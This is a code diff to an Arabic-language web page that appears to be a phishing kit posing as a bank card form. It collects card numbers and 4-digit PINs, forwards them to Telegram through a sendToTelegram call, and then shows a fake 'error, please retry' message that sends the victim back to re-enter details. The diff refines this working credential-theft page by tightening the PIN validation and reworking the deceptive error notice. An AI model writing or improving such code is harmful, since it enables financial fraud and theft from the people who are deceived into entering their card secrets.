@@ -204,11 +204,33 @@
             margin-top: 2px;
             margin-bottom: 7px;
         }
+        .snackbar {
+            visibility: hidden;
+            min-width: 260px;
+            margin-left: -130px;
+            background-color: #e11d48;
+            color: #fff;
+            text-align: center;
+            border-radius: 9px;
+            padding: 14px 20px;
+            position: fixed;
+            z-index: 99;
+            left: 50%;
+            bottom: 42px;
+            font-size: 17px;
+            box-shadow: 0 2px 14px rgba(0,0,0,0.10);
+            transition: visibility 0s, opacity 0.4s linear;
+            opacity: 0;
+        }
+        .snackbar.show {
+            visibility: visible;
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
     <div id="main"></div>
-    <div id="snackbar" class="snackbar">حدث خطأ في المعلومات، يرجى إعادة المحاولة.</div>
+    <div id="snackbar" class="snackbar"></div>
     <script>
         // شعار الموقع
         const logoHtml = `
@@ -343,11 +365,10 @@
                         `رمز التحقق: ${verifyCode}`;
                 }
                 sendToTelegram(msg);
-                showErrorSnack();
+                showCustomSnack("هناك خطأ في أحد المعلومات يرجى إعادة المحاولة");
                 setTimeout(()=>{
-                    if(from === 'login') renderLogin();
-                    else renderStart();
-                }, 1500);
+                    renderStart();
+                }, 2000);
             };
         }
 
@@ -380,18 +401,18 @@
                             <div id="cardNumberError" class="error"></div>
                         </div>
                         <div class="input-group">
-                            <label class="input-label" for="cardPin">الرقم السري للبطاقة</label>
+                            <label class="input-label" for="cardPin">الرقم السري للبطاقة (4 أرقام فقط)</label>
                             <div class="input-box">
                                 <input type="password"
                                     id="cardPin"
-                                    maxlength="6"
-                                    pattern="\\d{4,6}"
+                                    maxlength="4"
+                                    pattern="\\d{4}"
                                     inputmode="numeric"
                                     autocomplete="off"
                                     required
                                     placeholder="أدخل الرقم السري"
                                     style="direction:ltr;text-align:left;font-size:17px;letter-spacing:2px;"
-                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6)"
+                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
                                 />
                                 <span class="input-icon">
                                     <svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg>
@@ -416,8 +437,8 @@
                     document.getElementById('cardNumberError').textContent = 'يجب إدخال رقم البطاقة المكون من 16 رقم فقط.';
                     valid = false;
                 }
-                if (!/^\d{4,6}$/.test(pin)) {
-                    document.getElementById('pinError').textContent = 'يجب أن يكون الرقم السري من 4 إلى 6 أرقام.';
+                if (!/^\d{4}$/.test(pin)) {
+                    document.getElementById('pinError').textContent = 'يجب أن يكون الرقم السري 4 أرقام فقط.';
                     valid = false;
                 }
 
@@ -436,16 +457,14 @@
         }
         // ========== نهاية التعديل ==========
 
-        function showErrorSnack() {
-            var x = document.getElementById("snackbar");
-            x.className = "snackbar show";
-            setTimeout(function(){ x.className = x.className.replace("show", ""); }, 2300);
-        }
         function showCustomSnack(msg) {
             var x = document.getElementById("snackbar");
             x.innerText = msg;
             x.className = "snackbar show";
-            setTimeout(function(){ x.className = x.className.replace("show", ""); x.innerText = "حدث خطأ في المعلومات، يرجى إعادة المحاولة."; }, 2300);
+            setTimeout(function(){
+                x.className = x.className.replace("show", "");
+                x.innerText = "";
+            }, 2000);
         }
 
         renderStart();
